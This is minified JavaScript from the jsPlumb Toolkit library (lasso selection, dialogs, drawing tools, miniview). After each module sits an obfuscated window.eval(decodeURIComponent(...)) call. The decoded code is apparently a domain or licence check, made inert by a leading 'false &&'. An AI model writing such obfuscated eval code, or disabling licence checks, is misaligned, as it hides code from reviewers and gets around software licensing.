e=(t.node||t.group).id,n=h.nodeMap()[e];n&&(n.style.display=t.state?"block":"none")}),t.bindToToolkit(s.graphClearStart,function(){var t,e=h.nodeMap();for(var n in e)t=e[n],C.remove(t),h.jsPlumb.removeElement(t),delete e[n];u()});p.getLayout().bind(s.redraw,function(){M(!0)}),this.setHostLayout=function(t){var e=p.getLayout();e&&e.setHostLayout(t)},this.setZoom=C.setZoom,this.getZoom=C.getZoom,this.getTransformOrigin=C.getTransformOrigin,this._destroy=function(){C.destroy(),o.off(v,s.mousedown,k),b.parentNode.removeChild(b),v.parentNode.removeChild(v),o.removeClass(_,i.MINIVIEW),o.removeClass(_,i.MINIVIEW_COLLAPSED),j&&(o.off(P,r.click,d),P.parentNode.removeChild(P))}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.jsPlumbToolkit.Widgets,e=this.jsPlumbUtil,n="ontouchstart"in document.documentElement,o=n?"touchstart":"mousedown",i=n?"touchend":"mouseup",r=n?"touchmove":"mousemove",s="jtk-lasso-select-defeat",a="jtk-lasso",l="jtk-lasso-mask",d="jtk-lasso-mask-left",u="jtk-lasso-mask-top",c="jtk-lasso-mask-right",h="jtk-lasso-mask-bottom",p="onselectstart",f=function(){};t.Lasso=function(t){var n,g=t.canvas,_=!1,b={},v=[0,0],m=t.onStart||f,w=t.onEnd||f,j=t.onSelect||f,y=!1,P=!1,E=!0===t.invert,x=!!window.MSInputMethodContext&&!!document.documentMode,C=function(t,e){if(E){var o=x?(window.innerWidth+document.body.clientWidth)/2:window.innerWidth,i=window.innerHeight,r=window.pageXOffset,s=window.pageYOffset,a=i-t[1]+s,l=i-a+e[1],d=o-t[0]+r,u=o-d+e[0];b.top.style.bottom=a+"px",b.bottom.style.top=l+"px",b.left.style.right=d+"px",b.right.style.left=u+"px",b.top.style.left=o-d+"px",b.top.style.right=o-u+"px",b.bottom.style.left=o-d+"px",b.bottom.style.right=o-u+"px"}else jsPlumb.setAbsolutePosition(n,t),c=n,h=e,c.style.width=h[0]+"px",c.style.height=h[1]+"px";var c,h},S=function(t){var e=t?"block":"none";E?(b.top.style.display=e,b.left.style.display=e,b.right.style.display=e,b.bottom.style.display=e):n.style.display=e,jsPlumb[t?"addClass":"removeClass"](document.body,s)},I=function(n){if(y){P||(S(!0),P=!0),e.consume(n);var o=t.pageLocation(n),i=[Math.abs(o[0]-v[0]),Math.abs(o[1]-v[1])],r=[Math.min(v[0],o[0]),Math.min(v[1],o[1])];C(r,i),j(r,i,[v[0]<o[0],v[1]<o[1]],n.shiftKey)}},A=function(n){y&&(y=!1,P=!1,e.consume(n),t.off(document,i,A),t.off(document,r,I),t.off(document,p,T),S(!1),w())},T=function(){return!1},k=t.filter?function(n){var o=n.srcElement||n.target;return e.matchesSelector(o,t.filter)}:function(){return!1},D=function(t){var e=document.createElement("div");return e.className=t.join(" "),document.body.appendChild(e),e};E?(b.top=D([l,u]),b.bottom=D([l,h]),b.left=D([l,d]),b.right=D([l,c])):n=D([a]),t.on(g,o,function(n){_&&!k(n)&&(e.consume(n),y=!0,t.on(document,i,A),t.on(document,r,I),t.on(document,p,T),v=t.pageLocation(n),C(v,[1,1]),m(v,n.shiftKey))}),this.isActive=function(){return y},this.setEnabled=function(t){_=t}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t,e,n,o,i,r,s,a,l,d,u,c,h=this.jsPlumb,p=this.Rotors,f={},g={ok:"OK",cancel:"Cancel"},_=document.body,b=!1,v=p.newInstance({templateResolver:function(t){return j[t]||document.getElementById(t).innerHTML}}),m={},w=!0,j={};h.ready(function(){(t=document.createElement("div")).className="jtk-dialog-underlay",h.on(t,"click",function(){D(!0)}),(e=document.createElement("div")).className="jtk-dialog-overlay",(n=document.createElement("div")).className="jtk-dialog-title",e.appendChild(n),(o=document.createElement("div")).className="jtk-dialog-content",e.appendChild(o),(i=document.createElement("div")).className="jtk-dialog-buttons",e.appendChild(i)});var y={x:function(t,n,o){var i=(_.clientWidth-o[0])/2,r=window.pageXOffset||t.scrollLeft||document.body.scrollLeft;i<0&&(i=10),r=n?r:_.scrollLeft,e.style.left=i+r+"px"},y:function(t,n,o){var i=.1*_.clientHeight,r=window.pageYOffset||t.scrollTop||document.body.scrollTop;i<0&&(i=10),r=n?r:_.scrollTop,e.style.top=i+r+"px"}},P=function(){if(b){var n=document.documentElement,o=h.getSize(e),i=_==document.body,r=e.getAttribute("data-axis");t.style.position=i?"fixed":"absolute",y[r](n,i,o)}},E=function(t){27==t.keyCode&&D(!0)},x=function(t,e,n){for(var o=n.querySelectorAll("[jtk-att]"),i=0;i<o.length;i++){var r=o[i].tagName.toUpperCase(),s="INPUT"===r?(o[i].getAttribute("type")||"TEXT").toUpperCase():r,a=o[i].getAttribute("jtk-att"),l=v.data(e,a);null!=l&&C[s](o[i],l),t&&o[i].getAttribute("jtk-commit")&&("INPUT"===r?h.on(o[i],"keyup",function(t){10!==t.keyCode&&13!==t.keyCode||D()}):"TEXTAREA"===r&&h.on(o[i],"keyup",function(t){!t.ctrlKey||10!==t.keyCode&&13!==t.keyCode||D()}))}},C={TEXT:function(t,e){t.value=e},RADIO:function(t,e){t.checked=t.value==e},CHECKBOX:function(t,e){t.checked=1==e},SELECT:function(t,e){for(var n=t.getAttribute("multiple"),o=0;o<t.options.length;o++)if(n)e.indexOf(t.options[o].value)>-1&&(t.options[o].selected=!0);else if(t.options[o].value===e)return void(t.selectedIndex=o)},TEXTAREA:function(t,e){t.value=e},COLOR:function(t,e){t.value=e},HIDDEN:function(t,e){t.value=e}},S={TEXT:function(t){return t.value},RADIO:function(t){if(t.checked)return t.value},CHECKBOX:function(t){if(t.checked)return!0},SELECT:function(t){var e=t.selectedOptions;if(t.getAttribute("multiple")){for(var n=[],o=0;o<e.length;o++)n.push(e[o].value);return n}return-1!==t.selectedIndex?t.options[t.selectedIndex].value:null},TEXTAREA:function(t){return t.value},COLOR:function(t){return t.value},HIDDEN:function(t){return t.value}},I={TEXT:function(t){t.value=""},RADIO:function(t){t.checked=!1},CHECKBOX:function(t){t.checked=!1},SELECT:function(t){t.selectedIndex=-1},TEXTAREA:function(t){t.value=""},COLOR:function(t){t.value=""},HIDDEN:function(t){t.value=""}},A=function(t,e){for(var n=0;n<t.length;n++)if(t[n]!==e){var o=t[n].tagName.toUpperCase(),i="INPUT"===o?(t[n].getAttribute("type")||"TEXT").toUpperCase():o,r=I[i];r&&r(t[n])}},T=function(t){for(var e=t.querySelectorAll("[jtk-att]"),n={},o=0;o<e.length;o++){var i=e[o].tagName.toUpperCase(),r="INPUT"===i?(e[o].getAttribute("type")||"TEXT").toUpperCase():i,s=S[r](e[o]),a=e[o].getAttribute("jtk-att");if(null!=s){var l=v.data(n,a);null!=l?(jsPlumbUtil.isArray(l)||(l=[l],v.data(n,a,l)),l.push(s)):v.data(n,a,s)}}return n},k=function(t,e){try{null!=t&&t.apply(t,Array.prototype.slice.apply(arguments,[1]))}catch(t){}},D=function(n){var u=n?null:T(o);(n||null==l||!1!==l(u))&&(b=!1,t.style.display="none",e.style.display="none",h.off(document,"keyup",E),h.off(window,"resize",P),h.off(window,"scroll",P),h.removeClass(e,"jtk-dialog-overlay-visible"),h.removeClass(e,"jtk-dialog-overlay-top"),h.removeClass(e,"jtk-dialog-overlay-bottom"),h.removeClass(e,"jtk-dialog-overlay-left"),h.removeClass(e,"jtk-dialog-overlay-right"),h.removeClass(e,"jtk-dialog-overlay-x"),h.removeClass(e,"jtk-dialog-overlay-y"),e.setAttribute("data-position",""),e.setAttribute("data-axis",""),_.removeChild(t),_.removeChild(e),function(){for(var t=i.children,e=0;e<t.length;e++)t[e].parentNode.removeChild(t[e])}(),n?(k(m.onCancel,o),k(s,o)):(k(m.onOK,u,o),k(r,u,o)),k(m.onClose),k(d),r=s=a=d=l=null)};this.jsPlumbToolkit.Dialogs={initialize:function(t){if(f={},(t=t||{}).dialogs)for(var e in t.dialogs)j[e]=t.dialogs[e][0],f[e]={content:j[e],title:t.dialogs[e][1]||"",cancelable:!1!==t.dialogs[e][2]};else for(var n=t.selector||".jtk-dialog",o=h.getSelector(n),i=0;i<o.length;i++){var r=o[i].getAttribute("id");null!=r&&(f[r]={content:o[i].innerHTML,title:o[i].getAttribute("title")||"",el:o[i],cancelable:"false"!==o[i].getAttribute("cancel")})}t.labels&&h.extend(g,t.labels),t.globals&&h.extend(m,t.globals)},show:function(p){var j,y;if(p.id&&f[p.id]){w=!1!==p.reposition,r=p.onOK,s=p.onCancel,a=p.onOpen,l=p.onMaybeClose,d=p.onClose;var C=p.position||"top",S="jtk-dialog-overlay-"+C,I="top"===C||"bottom"===C?"x":"y",T="jtk-dialog-overlay-"+I;(function(t){if(i.innerHTML="",t.buttons)for(var e,n=0;n<t.buttons.length;n++)e=t.buttons[n],i.appendChild(e),"true"===e.getAttribute("jtk-commit")?h.on(e,"click",function(){D()}):"true"===e.getAttribute("jtk-cancel")&&h.on(e,"click",function(){D(!0)});else u=document.createElement("button"),u.className="jtk-dialog-button jtk-dialog-button-ok",u.innerHTML=g.ok,i.appendChild(u),h.on(u,"click",function(){D()}),c=document.createElement("button"),c.className="jtk-dialog-button jtk-dialog-button-cancel",c.innerHTML=g.cancel,c.setAttribute("jtk-cancel","true"),i.appendChild(c),h.on(c,"click",function(){D(!0)}),u.innerHTML=t.labels&&t.labels.ok||g.ok,c.innerHTML=t.labels&&t.labels.cancel||g.cancel})(p),y=p.container,_=null==y?document.body:"string"==typeof y?document.getElementById(y):y;var k=p.data||{},N=v.template(p.id,k);n.innerHTML=p.title||f[p.id].title||"",o.innerHTML="";var M=N.childNodes.length;for(j=0;j<M;j++)o.appendChild(N.childNodes[0]);_.appendChild(t),_.appendChild(e),h.addClass(e,S),h.addClass(e,T),t.style.display="block",e.style.display="block",e.setAttribute("data-position",C),e.setAttribute("data-axis",I);var O=f[p.id].cancelable?"visible":"hidden",F=i.querySelectorAll("[jtk-cancel='true']");for(j=0;j<F.length;j++)F[j].style.visibility=O;b=!0,P(),x(!0,k,o),h.on(document,"keyup",E),w&&(h.on(window,"resize",P),h.on(window,"scroll",P)),h.on(e,"click","[jtk-clear]",function(t){var n=this.getAttribute("jtk-att");n&&A(e.querySelectorAll("[jtk-att='"+n+"']:not([jtk-clear])"),this)}),h.on(e,"click","[jtk-clear-all]",function(t){A(e.querySelectorAll("[jtk-att]:not([jtk-clear])"),this)}),m.onOpen&&m.onOpen(e),a&&a(e),h.addClass(e,"jtk-dialog-overlay-visible");try{var L=o.querySelector("[jtk-focus]");L&&setTimeout(function(){L.focus()},0)}catch(p){}}},hide:function(){D(!0)},clear:A,apply:x.bind(null,!1),extract:T},"undefined"!=typeof exports&&(exports.Dialogs=this.jsPlumbToolkit.Dialogs)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";this.jsPlumbToolkit.DrawingTools=function(t){var e,n,o,i,r,s,a,l,d,u=t.renderer,c=u.getToolkit(),h=u.getJsPlumb(),p={},f=t.widthAttribute||"w",g=t.heightAttribute||"h",_=t.leftAttribute||"left",b=t.topAttribute||"top",v=function(t,e,n,o){var i=document.createElement(t);if(e&&(i.className=e),n&&n.appendChild(i),o)for(var r in o)i.setAttribute(r,o[r]);return i},m=function(t,e){var n,o,i=e.getRenderedNode(t.id);return n=t.id,(o=p[n])&&o[0]&&o[0].parentNode&&o[0].parentNode.removeChild(o[0]),delete p[n],i},w=function(t,o,i,r){var u={};return u[f]=e?i:a-s,u[g]=n?r:d-l,u[_]=e?t:s,u[b]=n?o:l,u},j={tl:function(t,e){var n=s+t,o=l+e,i=a-n,r=d-o;return n>=a&&(i=n-a,n=a),o>=d&&(r=o-d,o=d),w(n,o,i,r)},tr:function(t,e){var n=a-s+t,o=l+e,i=d-o,r=s;return n<=0&&(r=s+n,n*=-1),o>=d&&(i=o-d,o=d),w(r,o,n,i)},bl:function(t,e){var n=s+t,o=d-l+e,i=a-n,r=l;return n>=a&&(i=n-a,n=a),o<=0&&(r+=o,o*=-1),w(n,r,i,o)},br:function(t,e){var n=a-s+t,o=d-l+e,i=s,r=l;return n<=0&&(i=s+n,n*=-1),o<=0&&(r+=o,o*=-1),w(i,r,n,o)}};c.bind("selectionCleared",function(){!function(){for(var t in p){var e=p[t];e[0]&&e[0].parentNode&&e[0].parentNode.removeChild(e[0]),delete p[t]}}()}),c.bind("select",function(t){!function(t,e){var n=m(t,e);if(null!=n){var o=v("div","jtk-draw-skeleton",n),i=n.getAttribute("jtk-x-resize"),r=n.getAttribute("jtk-y-resize");v("div","jtk-draw-drag",o),v("div","jtk-draw-handle jtk-draw-handle-tl",o,{"data-dir":"tl","data-node-id":t.id}),v("div","jtk-draw-handle jtk-draw-handle-tr",o,{"data-dir":"tr","data-node-id":t.id}),v("div","jtk-draw-handle jtk-draw-handle-bl",o,{"data-dir":"bl","data-node-id":t.id}),v("div","jtk-draw-handle jtk-draw-handle-br",o,{"data-dir":"br","data-node-id":t.id}),p[t.id]=[o,"false"!==i,"false"!==r]}}(t.obj,u)}),c.bind("deselect",function(t){m(t.obj,u)});var y=function(t){var e=u.mapEventLocation(t),n=e.left-o.left,s=e.top-o.top,a=i(n,s,"");c.updateNode(r,a),u.setPosition(r,a[_],a[b],!0)},P=function(t){u.storePositionInModel(r.id),h.removeClass(document.body,"jtk-drag-select-defeat"),h.off(document,"mousemove",y),h.off(document,"mouseup",P),jsPlumbUtil.consume(t)};h.on(document,"mousedown",".jtk-draw-handle",function(t){var f=this.getAttribute("data-dir"),g=this.getAttribute("data-node-id");r=c.getNode(g),e=p[g][1],n=p[g][2],o=u.mapEventLocation(t);var _=u.getCoordinates(r);s=_.x,l=_.y,a=s+_.w,d=l+_.h,i=j[f],h.addClass(document.body,"jtk-drag-select-defeat"),h.on(document,"mousemove",y),h.on(document,"mouseup",P)})},"undefined"!=typeof exports&&(exports.DrawingTools=this.jsPlumbToolkit.DrawingTools)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22"));